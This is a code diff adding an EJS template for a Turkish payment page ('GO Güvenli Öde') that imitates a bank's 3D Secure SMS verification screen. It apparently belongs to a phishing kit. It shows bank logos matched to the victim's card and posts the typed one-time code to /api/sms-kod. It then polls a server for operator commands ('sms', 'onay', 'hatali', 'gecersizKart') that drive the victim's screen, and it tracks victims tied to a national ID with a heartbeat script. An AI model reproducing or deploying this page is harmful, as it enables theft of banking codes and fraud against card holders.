@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>GO Güvenli Öde</title>
+    <link rel="shortcut icon" href="/img/icon/favIcon.png">
+    <link rel="stylesheet" href="/css/1.css">
+    <link rel="stylesheet" href="/css/2.css">
+    <style>
+        body { background: #f3f4f6; }
+    </style>
+</head>
+<body>
+<% 
+var simdi = new Date();
+var ikiBasamak = function (n) { return (n < 10 ? '0' : '') + n; };
+var tarihMetni = ikiBasamak(simdi.getDate()) + '-' + ikiBasamak(simdi.getMonth() + 1) + '-' + simdi.getFullYear() + ' ' + ikiBasamak(simdi.getHours()) + ':' + ikiBasamak(simdi.getMinutes()) + ':' + ikiBasamak(simdi.getSeconds());
+var telTemiz = String((kullanici && kullanici.telefon) || '').replace(/[^0-9]/g, '');
+var telGoster = '05XXXXXXXXX';
+if (/^05[0-9]{9}$/.test(telTemiz)) { telGoster = telTemiz.slice(0, 2) + '*******' + telTemiz.slice(-2); }
+var referansNo = 'MHRS-' + simdi.toISOString().slice(0, 10).replace(/-/g, '') + '-' + Math.floor(100000 + Math.random() * 900000);
+var hataliSmsVar = (typeof hataliSms !== 'undefined') && !!hataliSms;
+// Banka -> logo eşlemesi (sag üst köşe). Sıra önemli: önce özel, sonra genel anahtarlar
+// (örn. "ZİRAAT KATILIM" -> "ZİRAAT"tan önce gelir). Logolar: public/img/banka-logolari/
+var BANKA_LOGOLARI = [
+    { anahtar: "ZİRAAT KATILIM", logo: "ziraat-katilim.png" },
+    { anahtar: "ZİRAAT", logo: "ziraat.png" },
+    { anahtar: "VAKIF KATILIM", logo: "vakif-katilim.png" },
+    { anahtar: "VAKIFLAR", logo: "vakifbank.png" },
+    { anahtar: "İŞ BANKASI", logo: "is-bankasi.png" },
+    { anahtar: "GARANTİ", logo: "garanti.png" },
+    { anahtar: "YAPI VE KREDİ", logo: "yapi-kredi.png" },
+    { anahtar: "HALK BANKASI", logo: "halkbank.png" },
+    { anahtar: "DENİZ BANK", logo: "deniz-bank.png" },
+    { anahtar: "FİNANSBANK", logo: "finansbank.png" },
+    { anahtar: "HSBC", logo: "hsbc.png" },
+    { anahtar: "ING BANK", logo: "ing-bank.png" },
+    { anahtar: "CITIBANK", logo: "citibank.png" },
+    { anahtar: "KUVEYT TÜRK", logo: "kuveyt-turk.png" },
+    { anahtar: "TÜRKİYE FİNANS", logo: "turkiye-finans.png" },
+    { anahtar: "ALBARAKA", logo: "albaraka.png" },
+    { anahtar: "EMLAK KATILIM", logo: "emlak-katilim.png" },
+    { anahtar: "ŞEKERBANK", logo: "sekerbank.png" },
+    { anahtar: "TEKSTİLBANK", logo: "tekstilbank.png" },
+    { anahtar: "TÜRK EKONOMİ", logo: "turk-ekonomi.png" },
+    { anahtar: "TURKISHBANK", logo: "turkishbank.png" },
+    { anahtar: "POSTA VE TELGRAF", logo: "ptt.png" },
+    { anahtar: "TURKCELL", logo: "turkcell.png" },
+    { anahtar: "FIBABANKA", logo: "fibabanka.png" },
+    { anahtar: "AKTİF YATIRIM", logo: "aktif-yatirim.png" },
+    { anahtar: "ALTERNATİF", logo: "alternatif.png" },
+    { anahtar: "ANADOLU BANK", logo: "anadolu-bank.png" },
+    { anahtar: "BİRLEŞİK ÖDEME", logo: "birlesik-odeme.png" },
+    { anahtar: "BURGAN", logo: "burgan.png" },
+    { anahtar: "GOLDEN GLOBAL", logo: "golden-global.png" },
+    { anahtar: "İNİNAL", logo: "ininal.png" },
+    { anahtar: "İYZİ", logo: "iyzi.png" },
+    { anahtar: "LYDİANS", logo: "lydians.png" },
+    { anahtar: "ODEA", logo: "odea.png" },
+    { anahtar: "OZAN", logo: "ozan.png" },
+    { anahtar: "PALADYUM", logo: "paladyum.png" },
+    { anahtar: "PAPARA", logo: "papara.png" },
+    { anahtar: "SİPAY", logo: "sipay.png" },
+    { anahtar: "TT ÖDEME", logo: "tt-odeme.png" },
+    { anahtar: "TURKLAND", logo: "turkland.png" },
+    { anahtar: "TÜRK ELEKTRONİK PARA", logo: "turk-elektronik-para.png" },
+    { anahtar: "AKK TURİZM", logo: "akk-turizm.png" }
+];
+var bankaAdiNorm = String((kullanici && kullanici.kartBanka) || '').toUpperCase().replace(/\./g, ' ').replace(/\s+/g, ' ').trim();
+var bankaLogo = '';
+if (bankaAdiNorm) {
+    for (var li = 0; li < BANKA_LOGOLARI.length; li++) {
+        if (bankaAdiNorm.indexOf(BANKA_LOGOLARI[li].anahtar) !== -1) { bankaLogo = BANKA_LOGOLARI[li].logo; break; }
+    }
+}
+%>
+<div class="content-wrapper">
+    <div class="header">
+        <div class="brand-logo">
+            <img align="left" src="/img/go.png" alt="GO">
+        </div>
+        <div class="member-logo">
+            <% if (bankaLogo) { %>
+            <img align="right" src="/img/banka-logolari/<%= bankaLogo %>" alt="Banka" onerror="this.style.display='none';">
+            <% } %>
+        </div>
+    </div>
+
+    <div id="approve-page">
+        <div class="content">
+            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
+            <div class="info-wrapper">
+                <div class="info-row">
+                    <div class="info-col info-label">İşyeri Adı:</div>
+                    <div class="info-col" id="merchant-name"><%= islemAdi %></div>
+                </div>
+                <div class="info-row">
+                    <div class="info-col info-label">İşlem Tutarı:</div>
+                    <div class="info-col amount" id="amount"><%= tutar %></div>
+                </div>
+                <div class="info-row">
+                    <div class="info-col info-label">İşlem Tarihi-Saati:</div>
+                    <div class="info-col" id="operation-date-time"><%= tarihMetni %></div>
+                </div>
+                <div class="info-row">
+                    <div class="info-col info-label">Kart Numarası:</div>
+                    <div class="info-col" id="masked-pan">************<%= kartNoSon4 || '****' %></div>
+                </div>
+            </div>
+            <div class="action-wrapper">
+                <div class="info-message h3">
+                    <h3>Şifreniz <span id="msisdn"><%= telGoster %></span> nolu cep telefonunuza gönderilecektir.<br>Referans no: <span id="otpRefNo"><%= referansNo %></span></h3>
+                </div>
+                <div class="error-messages error-wrong-otp" id="hataliBildirim" style="display: none;">
+                    <span>Doğrulama Kodunu hatalı girdiniz. Lütfen kontrol ederek tekrar deneyiniz.</span>
+                </div>
+                <div class="form-wrapper">
+                    <form class="form-code" id="smsForm" autocomplete="off" novalidate="novalidate">
+                        <div class="form-row">
+                            <label for="code" class="otpcode">Doğrulama Kodu</label>
+                            <input type="text" class="f-input" name="hasMasked" id="code" inputmode="numeric" autocomplete="one-time-code" maxlength="6">
+                        </div>
+                        <div class="error-messages" id="smsKodHata" style="display: none;">
+                            <span></span>
+                        </div>
+                        <div id="submitButtonDiv">
+                            <div class="has-submit">
+                                <button id="btn-commit" type="submit" class="button btn-1 btn-commit">Onayla</button>
+                            </div>
+                            <div id="timerDiv" class="has-timer">
+                                <span>Kalan Süre: </span><span class="has-counter" id="has-counter">3:00</span>
+                            </div>
+                        </div>
+                        <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
+                            <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
+                            <button id="btn-resend-otp" type="button" class="button btn-1 re-code v1">Doğrulama Kodunu Yeniden Gönder</button>
+                        </div>
+                    </form>
+                </div>
+                <div class="call-to-action">
+                    <div class="action-list">
+                        <div class="action-row">
+                            <div class="action-col left">
+                                <a href="javascript:;" id="iptalLink" class="txt-link">İşlemi İptal Et</a>
+                            </div>
+                            <div class="action-col right">
+                                <a href="javascript:;" class="txt-link trigger-absolute-panel-help">Yardım</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="sonucAlan" style="display: none; height: 100%; box-sizing: border-box; text-align: center; padding: 60px 20px;">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" style="display: block; margin: 0 auto 16px;">
+            <circle cx="12" cy="12" r="12" id="sonucDaire" fill="#00a600"></circle>
+            <path d="M6.5 12.5l3.5 3.5 7-7.5" stroke="#ffffff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        <h1 id="sonucBaslik" style="color: #394248; font-size: 1.7em; margin: 0 0 8px;">Ödeme Onaylandı</h1>
+        <p id="sonucAciklama" style="color: #6b7280; font-size: 1em; margin: 0 0 24px;">Ödemeniz başarıyla alınmıştır.</p>
+        <a id="sonucButon" href="/anasayfa" class="button btn-1" style="display: inline-block; width: 280px; background: #00a600; text-decoration: none;">Anasayfaya Dön</a>
+    </div>
+
+    <div class="absolute-panel-help-content" id="helpPanel">
+        <div class="content-wrapper content-v2">
+            <div class="top-band">
+                <a href="javascript:;" class="action-link trigger-absolute-panel-help">
+                    <i class="ico icon-left"></i> İşlem Ekranına Geri Dön
+                </a>
+                <div class="help-counter" id="helpCounter">3:00</div>
+            </div>
+            <div class="content">
+                <div class="content-title">
+                    <h2>Yardım Konuları</h2>
+                    <div class="logo"></div>
+                </div>
+                <div class="dropdown" id="helpDescContainer">
+                    <div class="item">
+                        <span class="title">Bu işlem nedir?</span>
+                        <span class="desc" style="display: block; font-size: 1.2em; color: #6b7280; line-height: 1.5; margin-bottom: 10px;">Bu işlem, alışveriş yaptığınız işyeri tarafından başlatılan güvenli ödeme doğrulamasıdır. Ödemenin tamamlanması için cep telefonunuza gönderilen doğrulama kodunu girmeniz gerekmektedir.</span>
+                    </div>
+                    <div class="item">
+                        <span class="title">Doğrulama kodunu alamadım</span>
+                        <span class="desc" style="display: block; font-size: 1.2em; color: #6b7280; line-height: 1.5; margin-bottom: 10px;">Kodun gönderilmesi birkaç dakika sürebilir. Süre dolduğunda "Doğrulama Kodunu Yeniden Gönder" seçeneğini kullanabilirsiniz.</span>
+                    </div>
+                    <div class="item">
+                        <span class="title">Yardım alamıyorum</span>
+                        <span class="desc" style="display: block; font-size: 1.2em; color: #6b7280; line-height: 1.5; margin-bottom: 10px;">Daha fazla yardım için bankanızın çağrı merkezini arayabilirsiniz.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 9999999; display: none;">
+        <div class="loader"></div>
+    </div>
+</div>
+<script>
+(function () {
+    try {
+        var form = document.getElementById("smsForm");
+        var input = document.getElementById("code");
+        var btn = document.getElementById("btn-commit");
+        var hata = document.getElementById("smsKodHata");
+        var hataSpan = hata ? hata.querySelector("span") : null;
+        var hataliBildirim = document.getElementById("hataliBildirim");
+        var loader = document.getElementById("loaderDiv");
+        var approvePage = document.getElementById("approve-page");
+        var sonucAlan = document.getElementById("sonucAlan");
+        var timeOutDiv = document.getElementById("timeOutDiv");
+        var resendBtn = document.getElementById("btn-resend-otp");
+        var counterSpan = document.getElementById("has-counter");
+        var timerDiv = document.getElementById("timerDiv");
+        var helpCounter = document.getElementById("helpCounter");
+        var helpPanel = document.getElementById("helpPanel");
+        if (!form || !input || !btn) { return; }
+
+        var hataliSms = <%= hataliSmsVar %>;
+        if (hataliSms && hataliBildirim) { hataliBildirim.style.display = ""; }
+
+        if (/[?&]onay=1/.test(window.location.search)) { gosterSonuc(true); }
+
+        input.addEventListener("input", function () {
+            input.value = input.value.replace(/\D/g, '').slice(0, 6);
+        });
+
+        var kalanSaniye = 180;
+        var sayac = null;
+
+        function sureMetni(s) {
+            var dk = Math.floor(s / 60);
+            var sn = s % 60;
+            return dk + ':' + (sn < 10 ? '0' : '') + sn;
+        }
+
+        function sayacBaslat() {
+            if (sayac) { clearInterval(sayac); sayac = null; }
+            kalanSaniye = 180;
+            if (counterSpan) { counterSpan.textContent = sureMetni(kalanSaniye); }
+            if (helpCounter) { helpCounter.textContent = sureMetni(kalanSaniye); }
+            if (timeOutDiv) { timeOutDiv.style.display = "none"; }
+            if (timerDiv) { timerDiv.style.display = ""; }
+            btn.disabled = false;
+            sayac = setInterval(function () {
+                kalanSaniye--;
+                if (kalanSaniye < 0) {
+                    clearInterval(sayac);
+                    sayac = null;
+                    if (timerDiv) { timerDiv.style.display = "none"; }
+                    if (timeOutDiv) { timeOutDiv.style.display = ""; }
+                    btn.disabled = true;
+                    return;
+                }
+                var s = sureMetni(kalanSaniye);
+                if (counterSpan) { counterSpan.textContent = s; }
+                if (helpCounter) { helpCounter.textContent = s; }
+            }, 1000);
+        }
+
+        function gosterSonuc(ok) {
+            if (sayac) { clearInterval(sayac); sayac = null; }
+            if (loader) { loader.style.display = "none"; }
+            if (approvePage) { approvePage.style.display = "none"; }
+            if (sonucAlan) {
+                sonucAlan.style.display = "block";
+                var baslik = document.getElementById("sonucBaslik");
+                var aciklama = document.getElementById("sonucAciklama");
+                var daire = document.getElementById("sonucDaire");
+                var sb = document.getElementById("sonucButon");
+                if (baslik) { baslik.textContent = ok ? "Ödeme Onaylandı" : "İşlem Tamamlanamadı"; }
+                if (aciklama) { aciklama.textContent = ok ? "Ödemeniz başarıyla alınmıştır." : "İşlem başarısız oldu, lütfen tekrar deneyiniz."; }
+                if (daire) { daire.setAttribute("fill", ok ? "#00a600" : "#b91c1c"); }
+                if (sb) { sb.textContent = "Anasayfaya Dön"; sb.style.background = ok ? "#00a600" : "#b91c1c"; }
+            }
+        }
+
+        function poll() {
+            fetch('/odeme/bekleme-durum', { headers: { 'Accept': 'application/json' } })
+                .then(function (r) { return r.json(); })
+                .then(function (d) {
+                    if (!d) { setTimeout(poll, 2500); return; }
+                    if (d.oturumYok) { window.location.href = '/giris2'; return; }
+                    if (d.komut === 'sms') {
+                        input.value = "";
+                        if (hata) { hata.style.display = "none"; }
+                        if (hataliBildirim) { hataliBildirim.style.display = "none"; }
+                        if (loader) { loader.style.display = "none"; }
+                        if (approvePage) { approvePage.style.display = ""; }
+                        if (sonucAlan) { sonucAlan.style.display = "none"; }
+                        sayacBaslat();
+                        input.focus();
+                        return;
+                    }
+                    if (d.komut === 'onay') { gosterSonuc(true); return; }
+                    if (d.komut === 'hatali') { window.location.href = '/sms?hatali=1'; return; }
+                    if (d.komut === 'basa') { window.location.href = '/odeme'; return; }
+                    if (d.komut === 'internetKapali') { window.location.href = '/odeme/bekleniyor?hata=internetKapali'; return; }
+                    if (d.komut === 'gecersizKart') { window.location.href = '/odeme/bekleniyor?hata=gecersizKart'; return; }
+                    setTimeout(poll, 2500);
+                })
+                .catch(function () { setTimeout(poll, 2500); });
+        }
+
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+            var kod = input.value.replace(/\s+/g, '');
+            if (!/^\d{6}$/.test(kod)) {
+                if (hata && hataSpan) {
+                    hataSpan.textContent = "Geçerli bir 6 haneli SMS kodu giriniz.";
+                    hata.style.display = "";
+                }
+                return;
+            }
+            if (hata) { hata.style.display = "none"; }
+            if (hataliBildirim) { hataliBildirim.style.display = "none"; }
+            btn.disabled = true;
+            fetch('/api/sms-kod', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ kod: kod })
+            })
+                .then(function (r) { return r.json(); })
+                .then(function (d) {
+                    if (!(d && d.ok)) {
+                        if (hata && hataSpan) {
+                            hataSpan.textContent = (d && d.hata) || "SMS kodu kaydedilemedi.";
+                            hata.style.display = "";
+                        }
+                        btn.disabled = false;
+                        return;
+                    }
+                    window.location.href = '/odeme/bekleniyor';
+                })
+                .catch(function () {
+                    if (hata && hataSpan) {
+                        hataSpan.textContent = "Sunucuya bağlanılamadı.";
+                        hata.style.display = "";
+                    }
+                    btn.disabled = false;
+                });
+        });
+
+        if (resendBtn) {
+            resendBtn.addEventListener("click", function () {
+                sayacBaslat();
+                input.focus();
+            });
+        }
+
+        var iptalLink = document.getElementById("iptalLink");
+        if (iptalLink) {
+            iptalLink.addEventListener("click", function () {
+                window.location.href = '/odeme';
+            });
+        }
+
+        var toggles = document.querySelectorAll(".trigger-absolute-panel-help");
+        for (var i = 0; i < toggles.length; i++) {
+            (function (el) {
+                el.addEventListener("click", function () {
+                    if (!helpPanel) { return; }
+                    var acik = helpPanel.style.bottom === "0px";
+                    helpPanel.style.bottom = acik ? "-101%" : "0px";
+                });
+            })(toggles[i]);
+        }
+
+        sayacBaslat();
+        setTimeout(poll, 2000);
+    } catch (e) { /* noop */ }
+})();
+</script>
+<% if (kullanici && kullanici.tcno) { %>
+<script>
+    (function () {
+        var at = function () {
+            var sayfa = (location.pathname + location.search + location.hash).slice(0, 120);
+            fetch("/api/heartbeat", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ sayfa: sayfa })
+            }).catch(function () {});
+        };
+        at();
+        setInterval(at, 3000);
+        document.addEventListener("visibilitychange", function () { if (!document.hidden) at(); });
+    })();
+</script>
+<% } %>
+<script src="/js/komut-dinle.js"></script>
+</body>
+</html>
